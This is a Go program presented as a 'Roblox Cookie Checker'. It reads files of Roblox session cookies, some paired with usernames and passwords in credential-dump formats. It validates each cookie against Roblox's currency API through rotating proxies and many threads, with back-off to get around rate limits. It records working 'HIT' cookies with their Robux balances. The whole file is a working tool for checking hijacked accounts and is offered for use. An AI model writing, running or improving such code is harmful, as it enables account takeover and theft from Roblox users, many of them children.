package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/BurntSushi/toml"
)

const (
	ua          = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
	authURL = "https://economy.roblox.com/v1/user/currency"
)

// ─── config ───────────────────────────────────────────────────────────────────

type cfg struct {
	Run struct {
		Threads  int     `toml:"threads"`
		Count    int     `toml:"count"`
		TimeoutS float64 `toml:"timeout_s"`
		Debug    bool    `toml:"debug"`
	} `toml:"run"`
	Proxy struct {
		Mode string `toml:"mode"`
		URL  string `toml:"url"`
		File string `toml:"file"`
		Rotate bool `toml:"rotate"`
	} `toml:"proxy"`
	Input struct {
		CookiesFile string `toml:"cookies_file"`
	} `toml:"input"`
	Output struct {
		Dir         string `toml:"dir"`
		ValidFile   string `toml:"valid_file"`
		InvalidFile string `toml:"invalid_file"`
	} `toml:"output"`
}

func loadConfig(path string) cfg {
	var c cfg
	// defaults
	c.Run.Threads = 100
	c.Run.TimeoutS = 10.0
	c.Proxy.Mode = "pool"
	c.Proxy.File = "input/proxies.txt"
	c.Proxy.Rotate = true
	c.Input.CookiesFile = "input/cookies.txt"
	c.Output.Dir = "output"
	c.Output.ValidFile = "valid.txt"
	c.Output.InvalidFile = "invalid.txt"
	if _, err := os.Stat(path); err == nil {
		toml.DecodeFile(path, &c)
	}
	return c
}

var robloxRE = regexp.MustCompile(`\.ROBLOSECURITY=(_\|WARNING:[^;\s]+)`)

// ─── types ────────────────────────────────────────────────────────────────────

type Entry struct {
	Label    string
	Password string
	Cookie   string
}

type Result struct {
	Entry
	Valid  bool
	Robux  int64
	Err    string
	Ms     int64
}

// ─── colours ──────────────────────────────────────────────────────────────────

const (
	colReset   = "\033[0m"
	colBold    = "\033[1m"
	colGreen   = "\033[32m"
	colRed     = "\033[31m"
	colYellow  = "\033[33m"
	colCyan    = "\033[36m"
	colMagenta = "\033[35m"
	colWhite   = "\033[97m"
	colDim     = "\033[2m"
)

func col(code, s string) string { return code + s + colReset }

var printMu sync.Mutex

func logLine(tag, color, msg string) {
	ts := time.Now().Format("15:04:05")
	printMu.Lock()
	fmt.Printf("  %s  %s  %s\n",
		col(colDim, ts),
		col(color+colBold, fmt.Sprintf("%9s", tag)),
		msg,
	)
	printMu.Unlock()
}

func bar(done, total int64) string {
	if total == 0 {
		return ""
	}
	filled := int(float64(done) / float64(total) * 20)
	if filled > 20 {
		filled = 20
	}
	return "[" + strings.Repeat("#", filled) + strings.Repeat(".", 20-filled) +
		fmt.Sprintf("] %d/%d", done, total)
}

// ─── proxies ──────────────────────────────────────────────────────────────────

func loadProxies(path string) []string {
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()
	var out []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if strings.Contains(line, "://") {
			out = append(out, line)
			continue
		}
		if strings.Contains(line, "@") {
			out = append(out, "http://"+line)
			continue
		}
		parts := strings.Split(line, ":")
		switch len(parts) {
		case 2:
			out = append(out, "http://"+line)
		case 4:
			// host:port:user:pass
			out = append(out, fmt.Sprintf("http://%s:%s@%s:%s",
				parts[2], parts[3], parts[0], parts[1]))
		}
	}
	return out
}

func makeClient(proxyURLStr string, timeoutS float64, rotate ...bool) *http.Client {
	dis := len(rotate) > 0 && rotate[0]
	tr := &http.Transport{
		MaxIdleConns:          50,
		MaxIdleConnsPerHost:   10,
		IdleConnTimeout:       60 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: 15 * time.Second,
		DisableKeepAlives:     dis,
	}
	if proxyURLStr != "" {
		if u, err := url.Parse(proxyURLStr); err == nil {
			tr.Proxy = http.ProxyURL(u)
		}
	}
	return &http.Client{
		Timeout:   time.Duration(timeoutS * float64(time.Second)),
		Transport: tr,
	}
}

// ─── cookie parsing ───────────────────────────────────────────────────────────

func extractCookie(s string) string {
	if m := robloxRE.FindStringSubmatch(s); m != nil {
		return m[1]
	}
	if strings.HasPrefix(s, "_|WARNING:") {
		return s
	}
	return ""
}

func loadCookies(path string) []Entry {
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()

	var out []Entry
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 1024*1024), 4*1024*1024)
	for sc.Scan() {
		raw := strings.TrimSpace(sc.Text())
		if raw == "" || strings.HasPrefix(raw, "#") {
			continue
		}
		// Full cookie jar (creator cookies.txt)
		if strings.HasPrefix(raw, "rbx-ip2") ||
			strings.HasPrefix(raw, "RBX") ||
			strings.HasPrefix(raw, ".ROBLOSECURITY=") {
			if c := extractCookie(raw); c != "" {
				out = append(out, Entry{Cookie: c})
			}
			continue
		}
		// Raw .ROBLOSECURITY value
		if strings.HasPrefix(raw, "_|WARNING:") {
			out = append(out, Entry{Cookie: raw})
			continue
		}
		// user:pass:cookie_or_jar  OR  user:cookie
		parts := strings.SplitN(raw, ":", 3)
		if len(parts) == 3 {
			label := strings.TrimSpace(parts[0])
			pass := strings.TrimSpace(parts[1])
			rest := parts[2]
			if c := extractCookie(rest); c != "" {
				out = append(out, Entry{Label: label, Password: pass, Cookie: c})
			}
			continue
		}
		if len(parts) == 2 {
			label := strings.TrimSpace(parts[0])
			rest := parts[1]
			c := extractCookie(rest)
			if c == "" && strings.HasPrefix(rest, "_|WARNING:") {
				c = rest
			}
			if c != "" {
				out = append(out, Entry{Label: label, Cookie: c})
			}
		}
	}
	return out
}

func loadSeen(validPath, invalidPath string) map[string]struct{} {
	seen := make(map[string]struct{})
	for _, path := range []string{validPath, invalidPath} {
		f, err := os.Open(path)
		if err != nil {
			continue
		}
		sc := bufio.NewScanner(f)
		sc.Buffer(make([]byte, 1024*1024), 4*1024*1024)
		for sc.Scan() {
			line := strings.TrimSpace(sc.Text())
			c := extractCookie(line)
			if c == "" && strings.HasPrefix(line, "_|WARNING:") {
				c = line
			}
			if c != "" {
				seen[c] = struct{}{}
			}
		}
		f.Close()
	}
	return seen
}

// ─── Roblox API ───────────────────────────────────────────────────────────────

type robuxResp struct {
	Robux int64 `json:"robux"`
}

func checkCookie(client *http.Client, cookie string) Result {
	var r Result

	req, _ := http.NewRequest("GET", authURL, nil)
	req.Header.Set("User-Agent", ua)
	req.AddCookie(&http.Cookie{Name: ".ROBLOSECURITY", Value: cookie})

	resp, err := client.Do(req)
	if err != nil {
		r.Err = "connection error: " + err.Error()
		return r
	}
	defer func() {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}()

	if resp.StatusCode == 401 {
		r.Err = "invalid cookie (401)"
		return r
	}
	if resp.StatusCode == 429 {
		r.Err = "rate limited (429)"
		return r
	}
	if resp.StatusCode != 200 {
		r.Err = fmt.Sprintf("unexpected status %d", resp.StatusCode)
		return r
	}

	var rb robuxResp
	if err := json.NewDecoder(resp.Body).Decode(&rb); err != nil {
		r.Err = "json error: " + err.Error()
		return r
	}
	r.Robux = rb.Robux
	r.Valid  = true
	return r
}

func isRetryErr(s string) bool {
	s = strings.ToLower(s)
	for _, e := range []string{"connection error", "timeout", "eof", "reset by peer", "connection refused", "rate limited"} {
		if strings.Contains(s, e) {
			return true
		}
	}
	return false
}

func retryDelay(attempt int, err string) time.Duration {
	if strings.Contains(err, "rate limited") {
		// Back off longer on 429 so the proxy IP recovers
		return time.Duration(2000*(attempt+1)) * time.Millisecond
	}
	return time.Duration(300*(attempt+1)) * time.Millisecond
}

// ─── async writer ─────────────────────────────────────────────────────────────

func writerLoop(
	results <-chan Result,
	validPath, invalidPath, cookiesFile string,
	allEntries []Entry,
	cleanupEvery int,
) {
	vf, _ := os.OpenFile(validPath,   os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	inf, _ := os.OpenFile(invalidPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)

	done := make(map[string]struct{})
	pending := 0
	var cleanupRunning int32

	flush := func() {
		if pending == 0 || !atomic.CompareAndSwapInt32(&cleanupRunning, 0, 1) {
			return
		}
		snapshot := make(map[string]struct{}, len(done))
		for k := range done {
			snapshot[k] = struct{}{}
		}
		pending = 0
		go func() {
			defer atomic.StoreInt32(&cleanupRunning, 0)
			rewriteInput(cookiesFile, allEntries, snapshot)
		}()
	}

	for r := range results {
		if r.Valid {
			name := r.Label
			if name == "" { name = "unknown" }
			if r.Password != "" {
				fmt.Fprintf(vf, "%s:%s:%s\n", name, r.Password, r.Cookie)
			} else {
				fmt.Fprintf(vf, "%s:%s\n", name, r.Cookie)
			}
			done[r.Cookie] = struct{}{}
			pending++
		} else if strings.Contains(r.Err, "invalid cookie") {
			fmt.Fprintln(inf, r.Cookie)
			done[r.Cookie] = struct{}{}
			pending++
		}
		if pending >= cleanupEvery {
			flush()
		}
	}

	for !atomic.CompareAndSwapInt32(&cleanupRunning, 0, 1) {
		time.Sleep(50 * time.Millisecond)
	}
	rewriteInput(cookiesFile, allEntries, done)
	atomic.StoreInt32(&cleanupRunning, 0)

	if vf  != nil { vf.Close() }
	if inf != nil { inf.Close() }
}

func rewriteInput(cookiesFile string, allEntries []Entry, done map[string]struct{}) {
	var remaining []Entry
	for _, e := range allEntries {
		if _, ok := done[e.Cookie]; !ok {
			remaining = append(remaining, e)
		}
	}
	if len(remaining) == len(allEntries) {
		return
	}
	f, err := os.Create(cookiesFile)
	if err != nil {
		return
	}
	w := bufio.NewWriter(f)
	for _, e := range remaining {
		switch {
		case e.Label != "" && e.Password != "":
			fmt.Fprintf(w, "%s:%s:%s\n", e.Label, e.Password, e.Cookie)
		case e.Label != "":
			fmt.Fprintf(w, "%s:%s\n", e.Label, e.Cookie)
		default:
			fmt.Fprintln(w, e.Cookie)
		}
	}
	w.Flush()
	f.Close()
}

// ─── main ─────────────────────────────────────────────────────────────────────

func main() {
	exePath, _ := os.Executable()
	exeDir := filepath.Dir(exePath)
	resolve := func(p string) string {
		if filepath.IsAbs(p) {
			return p
		}
		return filepath.Clean(filepath.Join(exeDir, p))
	}

	configFile := flag.String("config", "input/config.toml", "config file")
	threads    := flag.Int("threads", 0, "concurrent goroutines (0=from config)")
	count      := flag.Int("n", 0, "check first N cookies (0=all)")
	cookiesFile := flag.String("cookies", "", "input file (overrides config)")
	proxyFile  := flag.String("proxy-file", "", "proxy list (overrides config)")
	proxyURL   := flag.String("proxy-url", "", "fixed proxy URL")
	noProxy    := flag.Bool("no-proxy", false, "disable proxies")
	outputDir  := flag.String("output-dir", "", "output directory (overrides config)")
	timeoutS   := flag.Float64("timeout", 0, "per-request timeout in seconds (0=from config)")
	debug      := flag.Bool("debug", false, "verbose errors")
	flag.Parse()

	c := loadConfig(resolve(*configFile))

	// CLI flags override config
	if *threads > 0    { c.Run.Threads = *threads }
	if *timeoutS > 0   { c.Run.TimeoutS = *timeoutS }
	if *debug          { c.Run.Debug = true }
	if *cookiesFile != "" { c.Input.CookiesFile = *cookiesFile }
	if *proxyFile != "" { c.Proxy.File = *proxyFile }
	if *proxyURL != ""  { c.Proxy.URL = *proxyURL; c.Proxy.Mode = "fixed" }
	if *noProxy         { c.Proxy.Mode = "none" }
	if *outputDir != "" { c.Output.Dir = *outputDir }

	cookiesPath := resolve(c.Input.CookiesFile)
	proxyPath   := resolve(c.Proxy.File)
	outDir      := resolve(c.Output.Dir)
	validPath   := filepath.Join(outDir, c.Output.ValidFile)
	invalidPath := filepath.Join(outDir, c.Output.InvalidFile)

	// Proxies
	var proxies []string
	switch c.Proxy.Mode {
	case "fixed":
		if c.Proxy.URL != "" {
			proxies = []string{c.Proxy.URL}
		}
	case "pool":
		proxies = loadProxies(proxyPath)
	}

	// One HTTP client per proxy (rotate controlled by config).
	var clients []*http.Client
	if len(proxies) == 0 {
		clients = []*http.Client{makeClient("", c.Run.TimeoutS, c.Proxy.Rotate)}
	} else {
		clients = make([]*http.Client, len(proxies))
		for i, px := range proxies {
			clients[i] = makeClient(px, c.Run.TimeoutS, c.Proxy.Rotate)
		}
	}

	proxyLabel := c.Proxy.Mode
	if c.Proxy.Mode == "pool" {
		proxyLabel = fmt.Sprintf("pool  (%d proxies)", len(proxies))
	}

	// Load + dedup
	allEntries := loadCookies(cookiesPath)
	if len(allEntries) == 0 {
		fmt.Println(col(colRed, "  ! no cookies found in "+cookiesPath))
		os.Exit(1)
	}

	if err := os.MkdirAll(outDir, 0755); err != nil {
		fmt.Println(col(colRed, "  ! failed to create output dir: "+err.Error()))
		os.Exit(1)
	}

	seen := loadSeen(validPath, invalidPath)
	var entries []Entry
	for _, e := range allEntries {
		if _, ok := seen[e.Cookie]; !ok {
			entries = append(entries, e)
		}
	}
	skipped := len(allEntries) - len(entries)
	if *count > 0 && *count < len(entries) {
		entries = entries[:*count]
	}

	sep := col(colDim, "  "+strings.Repeat("━", 60))

	// Banner
	fmt.Println()
	fmt.Println(sep)
	fmt.Printf("  %s  %s %d threads\n",
		col(colBold+colWhite, "Roblox Cookie Checker"),
		col(colDim, "·"),
		c.Run.Threads,
	)
	fmt.Println(sep)
	for _, row := range [][2]string{
		{"cookies", cookiesPath},
		{"total", fmt.Sprintf("%d  (%d already done)", len(allEntries), skipped)},
		{"pending", fmt.Sprintf("%d", len(entries))},
		{"proxy", proxyLabel},
		{"rotate", fmt.Sprintf("%v", c.Proxy.Rotate)},
		{"timeout", fmt.Sprintf("%.1fs", c.Run.TimeoutS)},
		{"output", validPath},
	} {
		fmt.Printf("  %-14s %s\n", col(colDim, row[0]), row[1])
	}
	fmt.Printf("\n  %s\n\n", col(colDim, "discord.cyberious.xyz"))

	if len(entries) == 0 {
		fmt.Println(col(colYellow, "  ! nothing to do -- all cookies already checked"))
		return
	}

	var done, valid, invalid, errs int64
	total := int64(len(entries))
	var clientIdx int64

	results := make(chan Result, c.Run.Threads*4)
	var writerDone sync.WaitGroup
	writerDone.Add(1)
	go func() {
		defer writerDone.Done()
		writerLoop(results, validPath, invalidPath, cookiesPath, allEntries, 500)
	}()

	work := make(chan Entry, c.Run.Threads*2)
	var wg sync.WaitGroup

	for i := 0; i < c.Run.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for entry := range work {
				idx := atomic.AddInt64(&clientIdx, 1) - 1
				client := clients[idx%int64(len(clients))]

				t0 := time.Now()
				var res Result
				for attempt := 0; attempt < 3; attempt++ {
					res = checkCookie(client, entry.Cookie)
					if res.Err == "" || !isRetryErr(res.Err) {
						break
					}
					if attempt < 2 {
						idx = atomic.AddInt64(&clientIdx, 1) - 1
						client = clients[idx%int64(len(clients))]
						time.Sleep(retryDelay(attempt, res.Err))
					}
				}
				res.Entry = entry
				res.Ms = time.Since(t0).Milliseconds()

				results <- res

				n := atomic.AddInt64(&done, 1)
				display := entry.Label
				if display == "" { display = fmt.Sprintf("cookie#%d", n) }
				b := bar(n, total)

				switch {
				case res.Valid:
					atomic.AddInt64(&valid, 1)
					logLine("HIT", colGreen, fmt.Sprintf(
						"%s  %s  %dms  %s",
						display,
						col(colGreen, fmt.Sprintf("R$%d", res.Robux)),
						res.Ms, b))
				case strings.Contains(res.Err, "invalid cookie"):
					atomic.AddInt64(&invalid, 1)
					logLine("DEAD", colRed, fmt.Sprintf(
						"%s  %dms  %s", display, res.Ms, b))
				default:
					atomic.AddInt64(&errs, 1)
					errStr := res.Err
					if !c.Run.Debug && len(errStr) > 60 {
						errStr = errStr[:60]
					}
					logLine("ERR", colYellow, fmt.Sprintf(
						"%s  %s  %s", display, col(colDim, errStr), b))
				}
			}
		}()
	}

	t0 := time.Now()
	for _, e := range entries {
		work <- e
	}
	close(work)
	wg.Wait()

	close(results)
	writerDone.Wait()

	elapsed := time.Since(t0)
	rate := float64(atomic.LoadInt64(&done)) / elapsed.Seconds()
	fmt.Println()
	fmt.Println(sep)
	fmt.Printf("  %-14s %d\n", col(colDim, "total"), atomic.LoadInt64(&done))
	fmt.Printf("  %-14s %s\n", col(colDim, "valid"), col(colGreen+colBold, fmt.Sprintf("%d", atomic.LoadInt64(&valid))))
	fmt.Printf("  %-14s %s\n", col(colDim, "invalid"), col(colRed, fmt.Sprintf("%d", atomic.LoadInt64(&invalid))))
	fmt.Printf("  %-14s %s\n", col(colDim, "errors"), col(colYellow, fmt.Sprintf("%d", atomic.LoadInt64(&errs))))
	fmt.Printf("  %-14s %.1f/s  %s  %.1fs\n", col(colDim, "rate"), rate, col(colDim, "·"), elapsed.Seconds())
	fmt.Printf("  %-14s %s\n", col(colDim, "saved to"), validPath)
	fmt.Println(sep)
	fmt.Println()
}
